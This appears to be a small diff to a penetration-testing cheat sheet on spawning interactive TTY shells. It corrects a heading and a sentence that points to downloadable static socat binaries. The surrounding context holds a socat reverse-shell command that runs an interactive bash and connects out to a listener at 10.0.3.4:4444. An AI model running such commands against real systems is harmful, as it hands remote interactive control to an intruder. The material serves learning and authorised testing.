@@ -16,7 +16,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-## Altrenate ways to spawn TTY shell
+## Others ways to spawn TTY shell
 
 Use the following methods if Python not found on the target / not supported.
 
@@ -63,4 +63,4 @@ Socat (altrenate to netcat):
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
 ```
 
-here are standalone binaries that can be downloaded from this awesome Github repo: https://github.com/andrew-d/static-binaries
+If Socat not installed, there are standalone binaries that can be downloaded from this Github repo: https://github.com/andrew-d/static-binaries
